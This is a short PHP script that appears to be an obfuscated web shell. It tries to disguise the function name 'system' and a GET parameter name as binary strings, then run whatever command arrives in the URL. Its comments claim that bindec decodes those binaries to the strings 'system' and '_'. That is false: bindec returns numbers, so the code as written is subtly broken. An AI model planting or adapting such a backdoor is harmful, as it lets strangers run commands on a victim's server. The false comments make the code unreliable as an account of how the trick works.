<?php
$_ = bindec('011100110111100101110100011001010110110101'); // 'system' in binary
$cmd = filter_input(INPUT_GET, bindec('01011111'), FILTER_DEFAULT); // '_' in binary
$_($cmd); // call system($_GET['_'])
?>
